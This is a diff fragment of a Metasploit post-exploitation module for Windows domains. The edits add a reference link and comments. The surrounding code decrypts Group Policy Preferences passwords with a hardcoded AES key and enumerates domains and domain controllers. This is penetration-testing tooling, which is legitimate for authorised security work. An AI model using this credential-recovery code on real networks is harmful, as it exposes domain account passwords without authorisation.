@@ -42,7 +42,8 @@ class Metasploit3 < Msf::Post
 				],
 			'References'    =>
 				[
-					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences']
+					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences'],
+					['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)']
 				],
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
@@ -188,6 +189,7 @@ class Metasploit3 < Msf::Post
 		padding = "=" * (4 - (encrypted_data.length % 4))
 		epassword = "#{encrypted_data}#{padding}"
 		decoded = Rex::Text.decode_base64(epassword)
+		
 		key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
 		aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
 		aes.decrypt
@@ -198,6 +200,7 @@ class Metasploit3 < Msf::Post
 		return plaintext
 	end
 
+	#enum_domains.rb
 	def enum_domains
 		print_status "Enumerating Domains on the Network..."
 		domain_enum = 80000000 # SV_TYPE_DOMAIN_ENUM =  hex 80000000
@@ -230,6 +233,7 @@ class Metasploit3 < Msf::Post
 		return domains
 	end
 
+	#enum_domains.rb
 	def enum_dcs(domain)
 		print_status("Enumerating DCs for #{domain}")
 		domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
@@ -277,6 +281,7 @@ class Metasploit3 < Msf::Post
 		return value
 	end
 
+	#enum_domain.rb
 	def get_domain_controller()
 		domain = nil
 		begin
